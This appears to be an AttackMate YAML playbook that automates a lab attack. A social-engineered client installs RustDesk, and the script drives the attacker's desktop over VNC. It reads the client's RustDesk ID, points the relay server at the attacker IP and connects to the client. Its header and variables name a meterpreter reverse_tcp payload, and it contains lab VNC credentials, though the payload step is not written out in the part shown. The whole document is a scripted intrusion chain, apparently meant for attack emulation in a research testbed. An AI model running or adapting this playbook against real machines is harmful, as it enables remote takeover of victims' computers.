# Client is persuaded by attacker to download and setup rustdesk screensharing 
# attacker executes commands on client machine via screensharing todownload and executes meterpreter payload

vars:
  PAYLOAD: linux/x64/meterpreter/reverse_tcp
  LPORT: 4443
  ATTACKMATE_IP: 192.42.1.174
  CLIENT_IP: 192.168.50.100
  MGMT_IP: 192.42.0.201
  MGMT_USERNAME: aecid
  CLIENT_VNC_PORT: 5900
  CLIENT_VNC_USER: judy
  CLIENT_VNC_PASSWORD: garland
  ATTACKER_VNC_PORT: 5901
  RUSTDESK_PACKAGE: https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.deb


commands:

  - type: sleep
    seconds: 10
# connect to attacker screen
  - type: vnc
    cmd: capture
    filename: initial_screenshot.png
    hostname: localhost
    port: 5900
    creates_session: attacker

# Opening a terminal from the menu

  - type: vnc
    cmd: move
    x: 5
    y: 5
    session: attacker

  - type: vnc
    cmd: click
    session: attacker

  - type: sleep
    seconds: 10

  - type: vnc
    cmd: type
    input: "terminal"
    session: attacker
    
  - type: sleep
    seconds: 10

  - type: vnc
    cmd: key
    key: "enter"
    session: attacker

  - type: sleep
    seconds: 10

  - type: shell
    cmd: grep 'update_pk' /var/log/rustdesk/signalserver.log | awk '{last=$7} END{print last}'

  - type: setvar
    cmd: $RESULT_STDOUT
    variable: CLIENT_RUSTDESK_ID

  - type: shell
    cmd: cat rustdesk_public_key.txt

  - type: setvar
    cmd: $RESULT_STDOUT
    variable: RUSTDESK_KEY

  - type: sleep
    seconds: 2

  - type: vnc
    cmd: type
    input: "rustdesk"
    session: attacker

  - type: sleep
    seconds: 2

  - type: vnc
    cmd: key
    key: "enter"
    session: attacker

  - type: sleep
    seconds: 10

# enter the attacker ID in the rustdesk client on the attacker machine

# option menu
  - type: vnc
    cmd: move
    x: 167
    y: 188
    session: attacker

  - type: sleep
    seconds: 1

  - type: vnc
    cmd: click
    session: attacker

  - type: sleep
    seconds: 1

# network
  - type: vnc
    cmd: move
    x: 82
    y: 272
    session: attacker

  - type: vnc
    cmd: click
    session: attacker

  - type: sleep
    seconds: 1

# unlock network settings
  - type: vnc
    cmd: move
    x: 468
    y: 131
    session: attacker

  - type: vnc
    cmd: click
    session: attacker

  - type: sleep
    seconds: 1

  - type: vnc
    cmd: type
    input: "aecid"
    session: attacker
    
  - type: sleep
    seconds: 2

  - type: vnc
    cmd: key
    key: "enter"
    session: attacker

  - type: sleep
    seconds: 2

# id relay server
  - type: vnc
    cmd: move
    x: 351
    y: 182
    session: attacker

  - type: vnc
    cmd: click
    session: attacker

  - type: sleep
    seconds: 5

# Enter id server IP
  - type: vnc
    cmd: type
    input: $ATTACKMATE_IP
    session: attacker

  - type: sleep
    seconds: 5

# Key Field
  - type: vnc
    cmd: move
    x: 334
    y: 439
    session: attacker

  - type: vnc
    cmd: click
    session: attacker

  - type: sleep
    seconds: 5

# Enter key
  - type: vnc
    cmd: type
    input: $RUSTDESK_KEY
    session: attacker

  - type: sleep
    seconds: 5

# click ok
  - type: vnc
    cmd: move
    x: 621
    y: 490
    session: attacker

  - type: vnc
    cmd: click
    session: attacker

  - type: sleep
    seconds: 5


# open new terminal 
# Opening a terminal from the menu

  - type: vnc
    cmd: move
    x: 5
    y: 5
    session: attacker

  - type: vnc
    cmd: click
    session: attacker

  - type: sleep
    seconds: 5

  - type: vnc
    cmd: type
    input: "terminal"
    session: attacker
    
  - type: sleep
    seconds: 5

  - type: vnc
    cmd: key
    key: "enter"
    session: attacker

  - type: sleep
    seconds: 5

# Opening a new terminal from the menu in the client
#
#  - type: vnc
#    cmd: move
#    x: 5
#    y: 5
#    session: social_engineering
#
#  - type: vnc
#    cmd: click
#    session: social_engineering
#
#  - type: sleep
#    seconds: 3
#
#  - type: vnc
#    cmd: type
#    input: "terminal"
#    session: social_engineering
#    
#  - type: sleep
#    seconds: 3
#
#  - type: vnc
#    cmd: key
#    key: "enter"
#    session: social_engineering
#
#  - type: sleep
#    seconds: 3

 # open rustdesk with client id and client  from the terminal
  - type: vnc 
    cmd: type 
    input: "rustdesk --connect $CLIENT_RUSTDESK_ID -p password"
    session: attacker

  - type: sleep
    seconds: 3

  - type: vnc
    cmd: key
    key: "enter"
    session: attacker

  - type: sleep
    seconds: 20
#
#  - type: vnc
#    cmd: key
#    key: "enter"
#    session: attacker



